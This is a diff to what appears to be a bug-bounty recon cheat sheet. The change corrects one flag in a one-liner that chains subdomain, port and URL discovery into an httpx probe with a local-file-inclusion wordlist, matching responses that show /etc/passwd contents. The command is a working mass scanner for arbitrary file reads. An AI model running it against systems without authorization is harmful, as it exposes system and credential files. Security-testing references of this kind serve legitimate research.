@@ -151,7 +151,7 @@ https://github.com/hahwul/dalfox
 一键查找任意文件读取Credit: @Alra3ees , i just changed it a bit
 
 ```
- subfinder -silent -dL domain.txt |  dnsx -silent | naabu -top-ports 1000 -silent| gau |  gf lfi |  httpx  -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST  -tech-detect -status-code  -follow-redirects -mc 200 -mr "root:[x*]:0:0:"
+ subfinder -silent -dL domain.txt |  dnsx -silent | naabu -top-ports 1000 -silent| gau |  gf lfi |  httpx  -path lfi_wordlist.txt -threads 100 -random-agent -x GET,POST  -tech-detect -status-code  -follow-redirects -mc 200 -mr "root:[x*]:0:0:"
 ```
 
 
